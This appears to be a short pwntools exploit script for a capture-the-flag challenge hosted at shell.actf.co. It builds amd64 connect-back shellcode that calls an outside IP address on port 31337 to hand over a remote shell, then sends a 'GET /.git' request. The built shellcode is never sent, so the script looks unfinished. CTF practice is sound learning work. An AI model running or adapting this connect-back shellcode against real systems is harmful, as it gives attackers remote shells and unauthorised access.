from pwn import *

context.arch = 'amd64'
p=remote('shell.actf.co',19303)

sh = shellcraft.connect('13.124.209.139',31337)
sh += shellcraft.findpeersh(31337)

p.sendline('GET /.git ')
p.interactive()
